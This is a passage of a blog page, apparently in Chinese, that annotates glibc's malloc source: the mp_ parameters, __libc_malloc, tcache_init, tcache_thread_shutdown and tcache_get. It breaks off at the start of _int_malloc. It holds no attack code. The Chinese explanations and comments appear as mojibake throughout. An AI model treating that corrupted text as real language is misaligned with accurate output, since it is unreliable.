class="hljs-keyword">endif</span></span><br>&#125;;<br><br></code></pre></td></tr></table></figure>

<ul>
<li>trim_thresholdï¼šåœ¨free()ä¸­è¢«ä¿®å‰ªå‰çš„æœ€å¤§é¡¶éƒ¨å—å¤§å°ï¼Œé»˜è®¤ä¸º0x20000ã€‚</li>
<li>top_padï¼š å½“ æ‰©å¤§ top_chunk æ—¶ï¼Œéœ€è¦ç”³è¯·å¤šå°‘é¢å¤–çš„å†…å­˜ï¼Œé»˜è®¤ä¸º0x20000ã€‚</li>
<li>mmap_thresholdï¼šmmap()æ‰€æœåŠ¡çš„æœ€å°å—å¤§å°ï¼Œé»˜è®¤ä¸º0x20000ã€‚</li>
<li>arena_testï¼šé»˜è®¤ä¸º8ã€‚</li>
<li>arena_maxï¼šé»˜è®¤ä¸º0ã€‚</li>
<li>n_mmapsï¼šå½“å‰çš„mmapped chunkè®¡æ•°ï¼Œä»0å¼€å§‹ã€‚</li>
<li>n_mmaps_maxï¼šå…è®¸çš„æœ€å¤§mmapped chunksæ•°é‡ï¼Œé»˜è®¤ä¸º0x10000ã€‚ </li>
<li>max_n_mmapsï¼šåˆ° ç›®å‰ä¸ºæ­¢å¹¶å‘çš„mmapped chunksçš„æœ€é«˜æ•°é‡ã€‚</li>
<li>no_dyn_thresholdï¼šæ˜¯å¦ç¦ç”¨åŠ¨æ€ mmap thresholdè¡Œä¸ºã€‚</li>
<li>mmapped_memï¼šå½“å‰æœ‰å¤šå°‘å†…å­˜è¢«mmappedã€‚</li>
<li>max_mmapped_memï¼šä¸€æ¬¡æ€§å­˜åœ¨çš„æœ€é«˜mmappedå†…å­˜é‡ã€‚</li>
<li>sbrk_baseï¼šç”±sbrkå‘æ”¾çš„1ä¸ªst åœ°å€ã€‚</li>
<li>tcache_binsï¼š è¦ä½¿ç”¨çš„tcache binsçš„æ•°é‡ï¼Œé»˜è®¤ä¸º0x40ã€‚</li>
<li>tcache_max_bytesï¼štcache chunksæ”¯æŒçš„æœ€å¤§ç”¨æˆ·æ•°æ®ï¼Œé»˜è®¤ä¸º0x408ã€‚</li>
<li>tcache_countï¼šæ¯ä¸ª tcachebin ä¸­çš„æœ€å¤§å—æ•°ï¼Œé»˜è®¤ 7ã€‚</li>
<li>unsorted_limitï¼šå¡«å…… tcache æ—¶çš„æœ€å¤§ unsortedbin è¿­ä»£æ¬¡æ•°ã€‚</li>
</ul>
<h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  malloc(size_t n)</span><br><span class="hljs-comment">  Returns a pointer to a newly allocated chunk of at least n bytes, or null</span><br><span class="hljs-comment">  if no space is available. Additionally, on failure, errno is</span><br><span class="hljs-comment">  set to ENOMEM on ANSI C systems.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  If n is zero, malloc returns a minumum-sized chunk. (The minimum</span><br><span class="hljs-comment">  size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit</span><br><span class="hljs-comment">  systems.)  On most systems, size_t is an unsigned type, so calls</span><br><span class="hljs-comment">  with negative arguments are interpreted as requests for huge amounts</span><br><span class="hljs-comment">  of space, which will often fail. The maximum supported value of n</span><br><span class="hljs-comment">  differs across systems, but is in all cases less than the maximum</span><br><span class="hljs-comment">  representable value of a size_t.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> *__libc_malloc(<span class="hljs-type">size_t</span> bytes) &#123;<br>    mstate ar_ptr; <span class="hljs-comment">// arena</span><br>    <span class="hljs-type">void</span> *victim; <span class="hljs-comment">// æ‰€è¿”å›çš„å †å—</span><br><br>    <span class="hljs-comment">// è¯»å– __malloc_hook é’©å­, å¦‚æœæœ‰å€¼ï¼Œåˆ™è¿è¡Œé’©å­å‡½æ•°å¹¶è¿”å›</span><br>    <span class="hljs-type">void</span> *(*hook)(<span class="hljs-type">size_t</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read(__malloc_hook);<br>    <span class="hljs-keyword">if</span> (__builtin_expect(hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>        <span class="hljs-keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br><br>    <span class="hljs-comment">// ä½¿ç”¨ tchache çš„æƒ…å†µ</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>    <span class="hljs-comment">/* int_free also calls request2size, be careful to not pad twice.  */</span><br>    <span class="hljs-type">size_t</span> tbytes;<br><br>    <span class="hljs-comment">// åˆ¤æ–­è¯·æ±‚åˆ†é…å­—èŠ‚çš„å¤§å°</span><br>    <span class="hljs-comment">// è®¡ç®— bytes æ•°æ®éœ€è¦åˆ†é…çš„å†…å­˜å¤§å°ï¼Œå½“ bytes æ•°æ®çš„å¤§å°æ¯”æœ€å° chunk è¦è¿˜å°æ—¶,</span><br>    <span class="hljs-comment">// æŒ‰æœ€å° chunk çš„å¤§å°åˆ†é…ï¼›å½“ bytes æ•°æ®çš„å¤§å°æ¯”æœ€å° chunk å¤§æ—¶ï¼Œåˆ™åˆ†é…æ»¡è¶³å†…å­˜</span><br>    <span class="hljs-comment">// bytesæœ€å¤§ä¸è¶…è¿‡(unsigned long) (INTERNAL_SIZE_T) (-2 * MINSIZE)</span><br>    checked_request2size (bytes, tbytes);<br>    <span class="hljs-comment">// è®¡ç®— tbytes å¤§å°æ‰€å¯¹åº”çš„ tcache ä¸‹æ ‡</span><br>    <span class="hljs-type">size_t</span> tc_idx = csize2tidx (tbytes);<br>    <span class="hljs-comment">// å¦‚æœ tcache è¿˜æ²¡æœ‰è¢«åˆ›å»ºï¼Œåˆ™è°ƒç”¨ tcache_init() åˆå§‹åŒ– tcache</span><br>    MAYBE_INIT_TCACHE ();<br><br>    DIAG_PUSH_NEEDS_COMMENT;<br><br>    <span class="hljs-comment">// å¦‚æœ tc_idx åœ¨ tcache bins çš„èŒƒå›´å†…</span><br>    <span class="hljs-comment">// ä¸” tcache å­˜åœ¨</span><br>    <span class="hljs-comment">// ä¸” tc_idx å¯¹åº”çš„ entry ä¸ä¸ºç©º å³ æœ‰ç©ºé—²çš„ tcache chunk</span><br>    <span class="hljs-keyword">if</span> (tc_idx &lt; mp_.tcache_bins<br>        <span class="hljs-comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="hljs-comment">/* to appease gcc */</span><br>        &amp;&amp; tcache<br>        &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="hljs-literal">NULL</span>)<br>      &#123;<br>        <span class="hljs-comment">// è¿”å›ç›¸åº”çš„ tcache chunk</span><br>        <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>      &#125;<br>    DIAG_POP_NEEDS_COMMENT;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-comment">// æ²¡æœ‰å¯ç”¨å¤šçº¿ç¨‹çš„æƒ…å†µ</span><br>    <span class="hljs-keyword">if</span> (SINGLE_THREAD_P) &#123;<br>        <span class="hljs-comment">// è°ƒç”¨ _int_malloc è·å– chunk</span><br>        victim = _int_malloc(&amp;main_arena, bytes);<br>        <span class="hljs-comment">// æ»¡è¶³ä»¥ä¸‹ 3 ä¸ªæ¡ä»¶ä»»æ„ä¸€ä¸ªå³å¯è¿”å›</span><br>        <span class="hljs-comment">// 1. victim ä¸ºç©º</span><br>        <span class="hljs-comment">// 2. victim æ˜¯ä» mmap åˆ†é…çš„</span><br>        <span class="hljs-comment">// 3. victim æ˜¯ä»ä¸»åˆ†é…åŒºï¼ˆmain_arenaï¼‰åˆ†é…çš„</span><br>        assert(!victim || chunk_is_mmapped (mem2chunk(victim)) ||<br>               &amp;main_arena == arena_for_chunk (mem2chunk(victim)));<br>        <span class="hljs-keyword">return</span> victim;<br>    &#125;<br><br>    <span class="hljs-comment">// å¯ç”¨å¤šçº¿ç¨‹çš„æƒ…å†µ</span><br>    <span class="hljs-comment">// è·å–å½“å‰çš„ arena</span><br>    arena_get (ar_ptr, bytes);<br><br>    <span class="hljs-comment">// è°ƒç”¨ _int_malloc è·å– chunk</span><br>    victim = _int_malloc(ar_ptr, bytes);<br>    <span class="hljs-comment">/* Retry with another arena only if we were able to find a usable arena</span><br><span class="hljs-comment">       before.  */</span><br>    <span class="hljs-comment">// å¦‚æœæœªæˆåŠŸè·å– arena, æˆ–è€…æ²¡æœ‰åˆ†é… chunk</span><br>    <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>) &#123;<br>        LIBC_PROBE(memory_malloc_retry, <span class="hljs-number">1</span>, bytes);<br>        <span class="hljs-comment">// å†æ¬¡å°è¯•</span><br>        ar_ptr = arena_get_retry(ar_ptr, bytes);<br>        victim = _int_malloc(ar_ptr, bytes);<br>    &#125;<br><br>    <span class="hljs-comment">// é‡Šæ”¾çº¿ç¨‹é”</span><br>    <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<br>        __libc_lock_unlock(ar_ptr-&gt;mutex);<br><br>    <span class="hljs-comment">// æ»¡è¶³ä»¥ä¸‹ 3 ä¸ªæ¡ä»¶ä»»æ„ä¸€ä¸ªå³å¯è¿”å›</span><br>    <span class="hljs-comment">// 1. victim ä¸ºç©º</span><br>    <span class="hljs-comment">// 2. victim æ˜¯ä» mmap åˆ†é…çš„</span><br>    <span class="hljs-comment">// 3. victim æ˜¯ä»ä¸»åˆ†é…åŒºï¼ˆmain_arenaï¼‰åˆ†é…çš„</span><br>    assert(!victim || chunk_is_mmapped (mem2chunk(victim)) ||<br>           ar_ptr == arena_for_chunk (mem2chunk(victim)));<br>    <span class="hljs-keyword">return</span> victim;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="MAYBE-INIT-TCACHE"><a href="#MAYBE-INIT-TCACHE" class="headerlink" title="MAYBE_INIT_TCACHE"></a>MAYBE_INIT_TCACHE</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>...<br><span class="hljs-type">static</span> __thread <span class="hljs-type">bool</span> tcache_shutting_down = <span class="hljs-literal">false</span>;<br><span class="hljs-type">static</span> __thread tcache_perthread_struct *tcache = <span class="hljs-literal">NULL</span>;<br>...<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> MAYBE_INIT_TCACHE() \</span><br><span class="hljs-meta">  <span class="hljs-keyword">if</span> (__glibc_unlikely (tcache == NULL)) \</span><br><span class="hljs-meta">    tcache_init();</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span>  <span class="hljs-comment">/* !USE_TCACHE */</span></span><br><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> MAYBE_INIT_TCACHE()</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_thread_shutdown</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    <span class="hljs-comment">/* Nothing to do if there is no thread cache.  */</span><br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* !USE_TCACHE  */</span></span><br><br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">tcache_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-type">void</span> *victim = <span class="hljs-number">0</span>;<br>  <span class="hljs-comment">// è®¡ç®— tcahce_perthread_struct ç»“æ„ä½“çš„å¤§å°</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">size_t</span> bytes = <span class="hljs-keyword">sizeof</span> (tcache_perthread_struct);<br><br>  <span class="hljs-comment">// å¦‚æœ tcache è¢«ç¦ç”¨ï¼Œç›´æ¥è¿”å›</span><br>  <span class="hljs-keyword">if</span> (tcache_shutting_down)<br>    <span class="hljs-keyword">return</span>;<br><br>  <span class="hljs-comment">// ç»™ tcache åˆ†é…ç›¸åº”çš„å†…å­˜</span><br>  arena_get (ar_ptr, bytes);<br>  victim = _int_malloc (ar_ptr, bytes);<br>  <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      ar_ptr = arena_get_retry (ar_ptr, bytes);<br>      victim = _int_malloc (ar_ptr, bytes);<br>    &#125;<br><br><br>  <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<br>    __libc_lock_unlock (ar_ptr-&gt;mutex);<br><br>  <span class="hljs-comment">/* In a low memory situation, we may not be able to allocate memory</span><br><span class="hljs-comment">     - in which case, we just keep trying later.  However, we</span><br><span class="hljs-comment">     typically do this very early, so either there is sufficient</span><br><span class="hljs-comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span><br><span class="hljs-comment">     allocations anyway.  */</span><br>  <span class="hljs-keyword">if</span> (victim)<br>    &#123;<br>      <span class="hljs-comment">// ç»™ tcache èµ‹å€¼</span><br>      tcache = (tcache_perthread_struct *) victim;<br>      <span class="hljs-comment">// å°† tcache å¤„çš„å†…å­˜åˆå§‹åŒ–ä¸º 0</span><br>      <span class="hljs-built_in">memset</span> (tcache, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> (tcache_perthread_struct));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">tcache_thread_shutdown</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">int</span> i;<br>  tcache_perthread_struct *tcache_tmp = tcache;<br>  <span class="hljs-comment">// tcache ä¸å­˜åœ¨ç›´æ¥è¿”å›</span><br>  <span class="hljs-keyword">if</span> (!tcache)<br>    <span class="hljs-keyword">return</span>;<br><br>  <span class="hljs-comment">/* Disable the tcache and prevent it from being reinitialized.  */</span><br>  <span class="hljs-comment">// ç¦ç”¨ tcache å¹¶é˜²æ­¢å®ƒè¢«é‡æ–°åˆå§‹åŒ–</span><br>  tcache = <span class="hljs-literal">NULL</span>;<br>  tcache_shutting_down = <span class="hljs-literal">true</span>;<br><br>  <span class="hljs-comment">/* Free all of the entries and the tcache itself back to the arena</span><br><span class="hljs-comment">     heap for coalescing.  */</span><br>  <span class="hljs-comment">// å°†æ‰€æœ‰æ¡ç›®å’Œ tcache æœ¬èº«é‡Šæ”¾å› arena ä»¥è¿›è¡Œåˆå¹¶</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; TCACHE_MAX_BINS; ++i)<br>    &#123;<br>      <span class="hljs-keyword">while</span> (tcache_tmp-&gt;entries[i])<br>    &#123;<br>      tcache_entry *e = tcache_tmp-&gt;entries[i];<br>      tcache_tmp-&gt;entries[i] = e-&gt;next;<br>      __libc_free (e);<br>    &#125;<br>    &#125;<br><br>  __libc_free (tcache_tmp);<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span><br><span class="hljs-comment">   available chunks to remove.  */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> * <span class="hljs-title function_">tcache_get</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  <span class="hljs-comment">// å–å‡º tc_idx æ‰€å¯¹åº”çš„é“¾è¡¨</span><br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  assert (tcache-&gt;entries[tc_idx] &gt; <span class="hljs-number">0</span>);<br>  <span class="hljs-comment">// å–å‡ºç¬¬ä¸€ä¸ª</span><br>  tcache-&gt;entries[tc_idx] = e-&gt;next;<br>  <span class="hljs-comment">// å¯¹åº”çš„ tcache_count - 1</span><br>  --(tcache-&gt;counts[tc_idx]);<br>  <span class="hljs-comment">// è¿”å› chunk</span><br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *) e;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span 